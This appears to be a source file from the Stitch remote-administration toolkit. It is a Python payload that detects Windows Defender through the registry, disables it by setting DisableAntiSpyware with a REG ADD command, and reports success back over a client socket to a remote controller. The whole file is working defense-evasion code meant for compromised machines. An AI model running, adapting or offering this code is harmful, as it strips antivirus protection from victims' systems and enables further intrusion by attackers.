# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def windefnd_scan():
    defender = reg_exists('SOFTWARE\\Microsoft\\Windows Defender')
    if not defender: defender = reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    return bool(defender)

def windefnd_running():
    key = False
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows Defender')
    if key:
        try:
            val=_winreg.QueryValueEx(key, "DisableAntiSpyware")
            return val[0] != 1
        except:
            return False
    key = False

def disable_windef():
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        return run_command('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        return run_command('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')


if windefnd_scan():
    if windefnd_running():
        disable_windef()
        if windefnd_running():
            resp = "[!] Failed to disable Windows Defender\n"
        else:
            resp = "[+] Windows Defender is now disabled\n"
    else:
        resp = "[+] Windows Defender is already disabled\n"
else:
    resp = "[*] Windows Defender not detected on the system\n"
send(client_socket,resp)
